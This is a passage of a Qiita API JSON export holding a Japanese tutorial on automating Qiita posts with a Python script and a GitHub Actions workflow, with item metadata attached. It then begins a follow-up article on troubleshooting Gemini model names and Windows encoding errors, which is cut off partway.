を解析し、その結果を共有するという点で、ソフトウェア開発におけるドキュメント生成と似た側面を持っています。</p>\n<h2 data-sourcepos=\"41:1-41:62\">\n<span id=\"-技術的な仕組み実装アーキテクチャ\" class=\"fragment\"></span><a href=\"#-%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E4%BB%95%E7%B5%84%E3%81%BF%E5%AE%9F%E8%A3%85%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3\"><i class=\"fa fa-link\"></i></a>🔧 技術的な仕組み・実装・アーキテクチャ</h2>\n<p data-sourcepos=\"43:1-43:72\">今回のパイプラインは、以下の要素で構成されます。</p>\n<ol data-sourcepos=\"45:1-48:0\">\n<li data-sourcepos=\"45:1-45:96\">\n<strong>Python スクリプト</strong>: Qiita API を利用して記事を投稿するスクリプト。</li>\n<li data-sourcepos=\"46:1-46:161\">\n<strong>GitHub Actions ワークフロー</strong>: リポジトリへのプッシュをトリガーとして、Python スクリプトを実行するワークフロー。</li>\n<li data-sourcepos=\"47:1-48:0\">\n<strong>Qiita API トークン</strong>: Qiita API を利用するための認証情報。GitHub Actions のシークレットとして安全に管理します。</li>\n</ol>\n<p data-sourcepos=\"49:1-49:17\"><strong>メリット:</strong></p>\n<ul data-sourcepos=\"51:1-54:0\">\n<li data-sourcepos=\"51:1-51:43\">記事投稿の手間を大幅に削減</li>\n<li data-sourcepos=\"52:1-52:37\">継続的な知識共有を促進</li>\n<li data-sourcepos=\"53:1-54:0\">チーム内での情報共有を円滑化</li>\n</ul>\n<p data-sourcepos=\"55:1-55:20\"><strong>デメリット:</strong></p>\n<ul data-sourcepos=\"57:1-59:0\">\n<li data-sourcepos=\"57:1-57:59\">Qiita API の仕様変更に対応する必要がある</li>\n<li data-sourcepos=\"58:1-59:0\">GitHub Actions の設定に慣れる必要がある</li>\n</ul>\n<p data-sourcepos=\"60:1-60:26\"><strong>ハマりポイント:</strong></p>\n<ul data-sourcepos=\"62:1-64:0\">\n<li data-sourcepos=\"62:1-62:127\">Qiita API トークンの管理: GitHub Actions のシークレットとして安全に管理する必要があります。</li>\n<li data-sourcepos=\"63:1-64:0\">Python スクリプトの依存関係: GitHub Actions の環境に Python のライブラリをインストールする必要があります。</li>\n</ul>\n<h2 data-sourcepos=\"65:1-65:53\">\n<span id=\"-実践編動くコードコマンド例\" class=\"fragment\"></span><a href=\"#-%E5%AE%9F%E8%B7%B5%E7%B7%A8%E5%8B%95%E3%81%8F%E3%82%B3%E3%83%BC%E3%83%89%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>🧪 実践編：動くコード／コマンド例</h2>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"67:1-70:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># 必要なライブラリのインストール</span>\npip <span class=\"nb\">install </span>requests python-dotenv\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"72:1-109:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Qiita API を利用して記事を投稿する Python スクリプト (qiita_poster.py)\n</span><span class=\"kn\">import</span> <span class=\"n\">os</span>\n<span class=\"kn\">import</span> <span class=\"n\">requests</span>\n<span class=\"kn\">from</span> <span class=\"n\">dotenv</span> <span class=\"kn\">import</span> <span class=\"n\">load_dotenv</span>\n\n<span class=\"nf\">load_dotenv</span><span class=\"p\">()</span>\n\n<span class=\"n\">QIITA_API_TOKEN</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">environ</span><span class=\"p\">.</span><span class=\"nf\">get</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">QIITA_API_TOKEN</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">QIITA_ENDPOINT</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">https://qiita.com/api/v2/items</span><span class=\"sh\">\"</span>\n<span class=\"n\">HEADERS</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"sh\">\"</span><span class=\"s\">Authorization</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Bearer </span><span class=\"si\">{</span><span class=\"n\">QIITA_API_TOKEN</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n    <span class=\"sh\">\"</span><span class=\"s\">Content-Type</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sh\">\"</span><span class=\"s\">application/json</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">post_to_qiita</span><span class=\"p\">(</span><span class=\"n\">title</span><span class=\"p\">,</span> <span class=\"n\">body</span><span class=\"p\">,</span> <span class=\"n\">tags</span><span class=\"p\">,</span> <span class=\"n\">is_private</span><span class=\"o\">=</span><span class=\"bp\">False</span><span class=\"p\">):</span>\n    <span class=\"sh\">\"\"\"</span><span class=\"s\">Qiita に記事を投稿する</span><span class=\"sh\">\"\"\"</span>\n    <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n        <span class=\"sh\">\"</span><span class=\"s\">title</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">title</span><span class=\"p\">,</span>\n        <span class=\"sh\">\"</span><span class=\"s\">body</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">body</span><span class=\"p\">,</span>\n        <span class=\"sh\">\"</span><span class=\"s\">tags</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"p\">[{</span><span class=\"sh\">\"</span><span class=\"s\">name</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">tag</span><span class=\"p\">}</span> <span class=\"k\">for</span> <span class=\"n\">tag</span> <span class=\"ow\">in</span> <span class=\"n\">tags</span><span class=\"p\">],</span>\n        <span class=\"sh\">\"</span><span class=\"s\">private</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">is_private</span><span class=\"p\">,</span>\n    <span class=\"p\">}</span>\n    <span class=\"n\">response</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"n\">QIITA_ENDPOINT</span><span class=\"p\">,</span> <span class=\"n\">headers</span><span class=\"o\">=</span><span class=\"n\">HEADERS</span><span class=\"p\">,</span> <span class=\"n\">json</span><span class=\"o\">=</span><span class=\"n\">data</span><span class=\"p\">)</span>\n    <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">raise_for_status</span><span class=\"p\">()</span>  <span class=\"c1\"># エラーが発生した場合に例外を発生させる\n</span>    <span class=\"k\">return</span> <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">()</span>\n\n<span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"sh\">\"</span><span class=\"s\">__main__</span><span class=\"sh\">\"</span><span class=\"p\">:</span>\n    <span class=\"n\">title</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">テスト投稿</span><span class=\"sh\">\"</span>\n    <span class=\"n\">body</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">これはテスト投稿です。</span><span class=\"sh\">\"</span>\n    <span class=\"n\">tags</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"sh\">\"</span><span class=\"s\">Python</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Qiita</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">GitHub Actions</span><span class=\"sh\">\"</span><span class=\"p\">]</span>\n\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"nf\">post_to_qiita</span><span class=\"p\">(</span><span class=\"n\">title</span><span class=\"p\">,</span> <span class=\"n\">body</span><span class=\"p\">,</span> <span class=\"n\">tags</span><span class=\"p\">)</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">投稿成功！ URL: </span><span class=\"si\">{</span><span class=\"n\">result</span><span class=\"p\">[</span><span class=\"sh\">'</span><span class=\"s\">url</span><span class=\"sh\">'</span><span class=\"p\">]</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">exceptions</span><span class=\"p\">.</span><span class=\"n\">RequestException</span> <span class=\"k\">as</span> <span class=\"n\">e</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">投稿失敗: </span><span class=\"si\">{</span><span class=\"n\">e</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"yaml\" data-sourcepos=\"111:1-137:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># GitHub Actions ワークフローの定義 (qiita_poster.yml)</span>\n<span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Qiita Poster</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">push</span><span class=\"pi\">:</span>\n    <span class=\"na\">branches</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">main</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">deploy</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v3</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Set up Python </span><span class=\"m\">3.9</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-python@v3</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">python-version</span><span class=\"pi\">:</span> <span class=\"m\">3.9</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">python -m pip install --upgrade pip</span>\n          <span class=\"s\">pip install -r requirements.txt</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run Qiita Poster</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">QIITA_API_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.QIITA_API_TOKEN }}</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">python qiita_poster.py</span>\n</code></pre></div></div>\n<p data-sourcepos=\"139:1-139:17\"><strong>実行手順:</strong></p>\n<ol data-sourcepos=\"141:1-146:0\">\n<li data-sourcepos=\"141:1-141:47\">GitHub リポジトリを作成します。</li>\n<li data-sourcepos=\"142:1-142:84\">\n<code>qiita_poster.py</code> と <code>qiita_poster.yml</code> をリポジトリに追加します。</li>\n<li data-sourcepos=\"143:1-143:122\">\n<code>requirements.txt</code> ファイルを作成し、必要なライブラリ (requests, python-dotenv) を記述します。</li>\n<li data-sourcepos=\"144:1-144:145\">Qiita API トークンを取得し、GitHub リポジトリの Settings &gt; Secrets &gt; Actions に <code>QIITA_API_TOKEN</code> として登録します。</li>\n<li data-sourcepos=\"145:1-146:0\">リポジトリにプッシュすると、GitHub Actions が自動的に実行され、Qiita に記事が投稿されます。</li>\n</ol>\n<p data-sourcepos=\"147:1-147:20\"><strong>成功時ログ:</strong></p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"149:1-151:3\"><div class=\"highlight\"><pre><code>投稿成功！ URL: https://qiita.com/your_qiita_id/items/xxxxxxxxxxxxxxxxxxxx\n</code></pre></div></div>\n<p data-sourcepos=\"153:1-153:20\"><strong>失敗時ログ:</strong></p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"155:1-157:3\"><div class=\"highlight\"><pre><code>投稿失敗: 401 Client Error: Unauthorized for url: https://qiita.com/api/v2/items\n</code></pre></div></div>\n<p data-sourcepos=\"159:1-159:14\"><strong>注意点:</strong></p>\n<ul data-sourcepos=\"161:1-164:0\">\n<li data-sourcepos=\"161:1-161:88\">\n<code>qiita_poster.py</code> の <code>title</code>、<code>body</code>、<code>tags</code> を適宜変更してください。</li>\n<li data-sourcepos=\"162:1-162:134\">\n<code>qiita_poster.yml</code> の <code>branches</code> を、プッシュをトリガーとするブランチに合わせて変更してください。</li>\n<li data-sourcepos=\"163:1-164:0\">\n<code>requirements.txt</code> には、Python スクリプトに必要なすべてのライブラリを記述してください。</li>\n</ul>\n<h2 data-sourcepos=\"165:1-165:35\">\n<span id=\"-応用発展実用例\" class=\"fragment\"></span><a href=\"#-%E5%BF%9C%E7%94%A8%E7%99%BA%E5%B1%95%E5%AE%9F%E7%94%A8%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>🚀 応用・発展・実用例</h2>\n<ul data-sourcepos=\"167:1-172:0\">\n<li data-sourcepos=\"167:1-167:125\">\n<strong>記事内容の自動生成</strong>: AI を活用して記事の草稿を自動生成し、それを Qiita に投稿する。</li>\n<li data-sourcepos=\"168:1-168:182\">\n<strong>定期的な情報共有</strong>: 定期的に実行されるスクリプトを作成し、特定の情報を Qiita に自動投稿する（例：日々のニュースサマリ）。</li>\n<li data-sourcepos=\"169:1-169:179\">\n<strong>Docker 化</strong>: Python スクリプトを Docker コンテナ化することで、環境依存性の問題を解消し、より安定したパイプラインを構築する。</li>\n<li data-sourcepos=\"170:1-170:135\">\n<strong>可視化</strong>: データの可視化ツール (例: Matplotlib, Seaborn) で生成したグラフを Qiita 記事に埋め込む。</li>\n<li data-sourcepos=\"171:1-172:0\">\n<strong>創薬</strong>: 実験データや解析結果を自動的に Qiita に投稿し、研究チーム内での情報共有を効率化する。</li>\n</ul>\n<h2 data-sourcepos=\"173:1-173:32\">\n<span id=\"-まとめtakeaways\" class=\"fragment\"></span><a href=\"#-%E3%81%BE%E3%81%A8%E3%82%81takeaways\"><i class=\"fa fa-link\"></i></a>📝 まとめ（Takeaways）</h2>\n<p data-sourcepos=\"175:1-177:130\">生成日時: 2025-12-05 17:04:09<br>\nステータス: draft<br>\nタグ: Qiita, チュートリアル, Python, 自動化, ワークフロー, GitHubActions, CI/CD, 効率化, API, 初心者向け</p>\n",
      "body": "> **対象読者**  \n> Python をある程度書けるエンジニア、GitHub Actions に興味がある方、Qiita 投稿を効率化したい方\n\n> **動作確認環境 / 前提条件**  \n> - macOS Monterey (12.6.3)\n> - Python 3.9\n> - pip 23.0\n> - GitHub アカウント\n> - Qiita API トークン\n\n> **この記事で得られること**\n> - Qiita API を利用した記事投稿の自動化\n> - GitHub Actions を利用した CI/CD パイプラインの構築\n> - Python スクリプトのテストとデプロイの自動化\n\n## 🧭 導入：背景・課題・なぜ重要か\n\n日々の業務や学習で得た知識を Qiita に投稿するのは、エンジニアにとって非常に有益な習慣です。しかし、「記事を書く時間がない」「投稿が面倒」といった理由で、せっかくの知識が埋もれてしまうことも少なくありません。\n\nそこで、この記事では **Python と GitHub Actions を活用して、Qiita への記事投稿を自動化するパイプライン** を構築します。これにより、記事作成に集中し、より多くの知識を共有できるようになります。\n\n以前の記事 [使用例](https://qiita.com/cocokara_bioinfo/items/78b20fc5aff614e609e2) では、Qiita 投稿の効率化について紹介しましたが、今回はさらに一歩進んで、完全に自動化されたパイプラインを構築します。この自動化によって、記事の作成から投稿までの一連のフローが劇的に改善され、より多くの時間を記事の質向上に費やすことができるようになります。\n\n## 📘 トピックの概要\n\n今回のトピックは、**Qiita API を利用した記事投稿の自動化** です。Qiita API を利用することで、プログラムから Qiita に記事を投稿したり、既存の記事を更新したりすることができます。\n\n**GitHub Actions** は、GitHub 上で CI/CD (継続的インテグレーション/継続的デリバリー) パイプラインを構築するためのサービスです。GitHub リポジトリへのプッシュやプルリクエストをトリガーとして、自動的にテストやデプロイを実行できます。\n\n今回のパイプラインのイメージは以下の通りです。\n\n**文章で図解イメージ案:**\n\n1.  GitHub リポジトリに Markdown ファイル (Qiita 記事) をプッシュ\n2.  GitHub Actions がプッシュを検知\n3.  Python スクリプトが Markdown ファイルを読み込み、Qiita API を利用して記事を投稿\n4.  投稿結果を GitHub Actions のログに出力\n\nバイオインフォマティクス分野では、大量のデータを解析し、その結果を共有する必要があります。この自動投稿パイプラインは、解析結果を Qiita で共有する際に非常に役立ちます。例えば、ある遺伝子セットに対する解析結果を自動的に Qiita に投稿し、他の研究者と共有することができます。これは、**遺伝子配列という「文字列データ」** を解析し、その結果を共有するという点で、ソフトウェア開発におけるドキュメント生成と似た側面を持っています。\n\n## 🔧 技術的な仕組み・実装・アーキテクチャ\n\n今回のパイプラインは、以下の要素で構成されます。\n\n1.  **Python スクリプト**: Qiita API を利用して記事を投稿するスクリプト。\n2.  **GitHub Actions ワークフロー**: リポジトリへのプッシュをトリガーとして、Python スクリプトを実行するワークフロー。\n3.  **Qiita API トークン**: Qiita API を利用するための認証情報。GitHub Actions のシークレットとして安全に管理します。\n\n**メリット:**\n\n*   記事投稿の手間を大幅に削減\n*   継続的な知識共有を促進\n*   チーム内での情報共有を円滑化\n\n**デメリット:**\n\n*   Qiita API の仕様変更に対応する必要がある\n*   GitHub Actions の設定に慣れる必要がある\n\n**ハマりポイント:**\n\n*   Qiita API トークンの管理: GitHub Actions のシークレットとして安全に管理する必要があります。\n*   Python スクリプトの依存関係: GitHub Actions の環境に Python のライブラリをインストールする必要があります。\n\n## 🧪 実践編：動くコード／コマンド例\n\n```bash\n# 必要なライブラリのインストール\npip install requests python-dotenv\n```\n\n```python\n# Qiita API を利用して記事を投稿する Python スクリプト (qiita_poster.py)\nimport os\nimport requests\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nQIITA_API_TOKEN = os.environ.get(\"QIITA_API_TOKEN\")\nQIITA_ENDPOINT = \"https://qiita.com/api/v2/items\"\nHEADERS = {\n    \"Authorization\": f\"Bearer {QIITA_API_TOKEN}\",\n    \"Content-Type\": \"application/json\",\n}\n\ndef post_to_qiita(title, body, tags, is_private=False):\n    \"\"\"Qiita に記事を投稿する\"\"\"\n    data = {\n        \"title\": title,\n        \"body\": body,\n        \"tags\": [{\"name\": tag} for tag in tags],\n        \"private\": is_private,\n    }\n    response = requests.post(QIITA_ENDPOINT, headers=HEADERS, json=data)\n    response.raise_for_status()  # エラーが発生した場合に例外を発生させる\n    return response.json()\n\nif __name__ == \"__main__\":\n    title = \"テスト投稿\"\n    body = \"これはテスト投稿です。\"\n    tags = [\"Python\", \"Qiita\", \"GitHub Actions\"]\n\n    try:\n        result = post_to_qiita(title, body, tags)\n        print(f\"投稿成功！ URL: {result['url']}\")\n    except requests.exceptions.RequestException as e:\n        print(f\"投稿失敗: {e}\")\n```\n\n```yaml\n# GitHub Actions ワークフローの定義 (qiita_poster.yml)\nname: Qiita Poster\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - name: Set up Python 3.9\n        uses: actions/setup-python@v3\n        with:\n          python-version: 3.9\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install -r requirements.txt\n      - name: Run Qiita Poster\n        env:\n          QIITA_API_TOKEN: ${{ secrets.QIITA_API_TOKEN }}\n        run: python qiita_poster.py\n```\n\n**実行手順:**\n\n1.  GitHub リポジトリを作成します。\n2.  `qiita_poster.py` と `qiita_poster.yml` をリポジトリに追加します。\n3.  `requirements.txt` ファイルを作成し、必要なライブラリ (requests, python-dotenv) を記述します。\n4.  Qiita API トークンを取得し、GitHub リポジトリの Settings > Secrets > Actions に `QIITA_API_TOKEN` として登録します。\n5.  リポジトリにプッシュすると、GitHub Actions が自動的に実行され、Qiita に記事が投稿されます。\n\n**成功時ログ:**\n\n```\n投稿成功！ URL: https://qiita.com/your_qiita_id/items/xxxxxxxxxxxxxxxxxxxx\n```\n\n**失敗時ログ:**\n\n```\n投稿失敗: 401 Client Error: Unauthorized for url: https://qiita.com/api/v2/items\n```\n\n**注意点:**\n\n*   `qiita_poster.py` の `title`、`body`、`tags` を適宜変更してください。\n*   `qiita_poster.yml` の `branches` を、プッシュをトリガーとするブランチに合わせて変更してください。\n*   `requirements.txt` には、Python スクリプトに必要なすべてのライブラリを記述してください。\n\n## 🚀 応用・発展・実用例\n\n*   **記事内容の自動生成**: AI を活用して記事の草稿を自動生成し、それを Qiita に投稿する。\n*   **定期的な情報共有**: 定期的に実行されるスクリプトを作成し、特定の情報を Qiita に自動投稿する（例：日々のニュースサマリ）。\n*   **Docker 化**: Python スクリプトを Docker コンテナ化することで、環境依存性の問題を解消し、より安定したパイプラインを構築する。\n*   **可視化**: データの可視化ツール (例: Matplotlib, Seaborn) で生成したグラフを Qiita 記事に埋め込む。\n*   **創薬**: 実験データや解析結果を自動的に Qiita に投稿し、研究チーム内での情報共有を効率化する。\n\n## 📝 まとめ（Takeaways）\n\n生成日時: 2025-12-05 17:04:09\nステータス: draft\nタグ: Qiita, チュートリアル, Python, 自動化, ワークフロー, GitHubActions, CI/CD, 効率化, API, 初心者向け\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-05T17:04:22+09:00",
      "group": null,
      "id": "7440c80d8e6a98177957",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Qiita",
          "versions": []
        },
        {
          "name": "Python",
          "versions": []
        },
        {
          "name": "自動化",
          "versions": []
        },
        {
          "name": "チュートリアル",
          "versions": []
        },
        {
          "name": "ワークフロー",
          "versions": []
        }
      ],
      "title": "Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術",
      "updated_at": "2025-12-05T17:04:22+09:00",
      "url": "https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957",
      "user": {
        "description": "ポッケ村出身の名もなき若手生物学研究員です。\r\n現代の技術やエンジニア知識を学びながらモンスターハンターの生態・生物学研究に日々励んでおります！\r\nまだまだ勉強不足なところはありますが、皆さんに少しでも学びになるものをお届けできればとの思いで発信させていただきます\r\n\r\n※フィクションとして、時にTips記事として楽しんでいただければ幸いです",
        "facebook_id": "",
        "followees_count": 3,
        "followers_count": 0,
        "github_login_name": null,
        "id": "cocokara_bioinfo",
        "items_count": 4,
        "linkedin_id": "",
        "location": "",
        "name": "シャル・S 調査員",
        "organization": "Genome & Ecology Monster-Lab (架空)",
        "permanent_id": 4288059,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocLkgrrRuDzozKQ4XeInetzc0um1rPWRGXY2daT9pLIi1z1JdQ=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": 126,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "my_popular"
    },
    {
      "rendered_body": "<blockquote data-sourcepos=\"1:1-2:162\">\n<p data-sourcepos=\"1:3-2:162\"><strong>対象読者</strong><br>\nPython を利用したことがあるエンジニア、GitHub Actions を利用したことがあるエンジニア、Qiita への投稿を効率化したい方</p>\n</blockquote>\n<blockquote data-sourcepos=\"4:1-9:211\">\n<p data-sourcepos=\"4:3-4:41\"><strong>動作確認環境 / 前提条件</strong></p>\n<ul data-sourcepos=\"5:3-9:211\">\n<li data-sourcepos=\"5:3-5:24\">macOS Ventura 13.6.3</li>\n<li data-sourcepos=\"6:3-6:17\">Python 3.11.5</li>\n<li data-sourcepos=\"7:3-7:26\">GitHub アカウント</li>\n<li data-sourcepos=\"8:3-8:95\">Qiita API v2 の理解（<a href=\"https://qiita.com/api/v2/docs\">公式ドキュメント</a>参照）</li>\n<li data-sourcepos=\"9:3-9:211\">以前の記事「<a href=\"https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957\" id=\"reference-f84ecb787f5c23d4b71a\">Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術</a>」の内容を理解していること</li>\n</ul>\n</blockquote>\n<blockquote data-sourcepos=\"11:1-14:88\">\n<p data-sourcepos=\"11:3-11:39\"><strong>この記事で得られること</strong></p>\n<ul data-sourcepos=\"12:3-14:88\">\n<li data-sourcepos=\"12:3-12:78\">Qiita 記事投稿を自動化する Python スクリプトの構築方法</li>\n<li data-sourcepos=\"13:3-13:74\">GitHub Actions を利用した CI/CD パイプラインの構築方法</li>\n<li data-sourcepos=\"14:3-14:88\">自動化パイプライン構築におけるハマりどころと、その解決策</li>\n</ul>\n</blockquote>\n<h2 data-sourcepos=\"17:1-17:45\">\n<span id=\"実際に躓いたポイントと解決策\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E9%9A%9B%E3%81%AB%E8%BA%93%E3%81%84%E3%81%9F%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%A8%E8%A7%A3%E6%B1%BA%E7%AD%96\"><i class=\"fa fa-link\"></i></a>実際に躓いたポイントと解決策</h2>\n<h3 data-sourcepos=\"19:1-19:41\">\n<span id=\"1-gemini-apiのモデル名エラー\" class=\"fragment\"></span><a href=\"#1-gemini-api%E3%81%AE%E3%83%A2%E3%83%87%E3%83%AB%E5%90%8D%E3%82%A8%E3%83%A9%E3%83%BC\"><i class=\"fa fa-link\"></i></a>1. Gemini APIのモデル名エラー</h3>\n<p data-sourcepos=\"21:1-21:12\"><strong>問題</strong>:</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"22:1-24:3\"><div class=\"highlight\"><pre><code>404 models/gemini-1.5-flash is not found for API version v1beta\n</code></pre></div></div>\n<p data-sourcepos=\"26:1-26:12\"><strong>原因</strong>:</p>\n<ul data-sourcepos=\"27:1-29:0\">\n<li data-sourcepos=\"27:1-27:138\">設定ファイルで<code>gemini-1.5-flash</code>を指定していたが、実際に利用可能なモデルは<code>models/gemini-2.0-flash</code>だった</li>\n<li data-sourcepos=\"28:1-29:0\">Google Gemini APIは定期的にモデル名が更新される</li>\n</ul>\n<p data-sourcepos=\"30:1-30:14\"><strong>解決策</strong>:</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"31:1-45:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># 利用可能なモデルを確認\n</span><span class=\"n\">models</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"n\">m</span> <span class=\"k\">for</span> <span class=\"n\">m</span> <span class=\"ow\">in</span> <span class=\"n\">genai</span><span class=\"p\">.</span><span class=\"nf\">list_models</span><span class=\"p\">()</span> \n          <span class=\"k\">if</span> <span class=\"sh\">'</span><span class=\"s\">generateContent</span><span class=\"sh\">'</span> <span class=\"ow\">in</span> <span class=\"n\">m</span><span class=\"p\">.</span><span class=\"n\">supported_generation_methods</span><span class=\"p\">]</span>\n<span class=\"c1\"># 結果: models/gemini-2.0-flash, models/gemini-2.5-flash など\n</span>\n<span class=\"c1\"># 設定ファイルを更新\n</span><span class=\"p\">{</span>\n  <span class=\"sh\">\"</span><span class=\"s\">api</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"sh\">\"</span><span class=\"s\">gemini</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"sh\">\"</span><span class=\"s\">model</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sh\">\"</span><span class=\"s\">models/gemini-2.0-flash</span><span class=\"sh\">\"</span>  <span class=\"c1\"># models/プレフィックスが必要\n</span>    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"47:1-47:129\"><strong>学んだこと</strong>: APIの仕様変更に備えて、利用可能なモデルを動的に確認する仕組みを追加すべき</p>\n<h3 data-sourcepos=\"49:1-49:60\">\n<span id=\"2-windowsコンソールのunicode文字表示エラー\" class=\"fragment\"></span><a href=\"#2-windows%E3%82%B3%E3%83%B3%E3%82%BD%E3%83%BC%E3%83%AB%E3%81%AEunicode%E6%96%87%E5%AD%97%E8%A1%A8%E7%A4%BA%E3%82%A8%E3%83%A9%E3%83%BC\"><i class=\"fa fa-link\"></i></a>2. WindowsコンソールのUnicode文字表示エラー</h3>\n<p data-sourcepos=\"51:1-51:11\"><strong>問題</strong>:</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"52:1-54:3\"><div class=\"highlight\"><pre><code>UnicodeEncodeError: 'cp932' codec can't encode character '✓' in position 0\n</code></pre></div></div>\n<p data-sourcepos=\"56:1-56:12\"><strong>原因</strong>:</p>\n<ul data-sourcepos=\"57:1-58:0\">\n<li data-sourcepos=\"57:1-58:0\">WindowsのPowerShellでは、Unicode文字（✓、⚠、✗）がデフォルトのエンコーディング（cp932）で表示できない</li>\n</ul>\n<p data-sourcepos=\"59:1-59:14\"><strong>解決策</strong>:</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"60:1-65:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Unicode文字を通常の文字に置き換え\n</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span 